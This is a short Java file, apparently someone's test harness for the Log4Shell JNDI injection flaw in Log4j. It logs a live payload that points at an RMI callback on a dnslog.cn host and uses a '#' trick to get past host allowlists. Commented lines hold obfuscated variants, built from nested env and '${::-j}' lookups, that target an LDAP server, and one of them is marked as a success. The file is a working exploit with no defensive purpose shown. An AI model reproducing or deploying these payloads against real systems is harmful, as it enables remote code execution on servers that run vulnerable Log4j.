import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
//import org.osgi.service.log.LogListener;

public class log4j {

    private static Logger logger = LogManager.getLogger(log4j.class);
    public static void main(String[] args) {
        //logger.error("${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//192.168.3.16:1389/gkpbai}");
        /*
         * ${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//192.168.3.16:1389/mpffmo}
         * success log
         */

        //logger.error("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://3qbuik.dnslog.cn/123}");
        logger.error("${jndi:rmi://127.0.0.1#.pbnmgm.dnslog.cn/#exp}");
    }
}
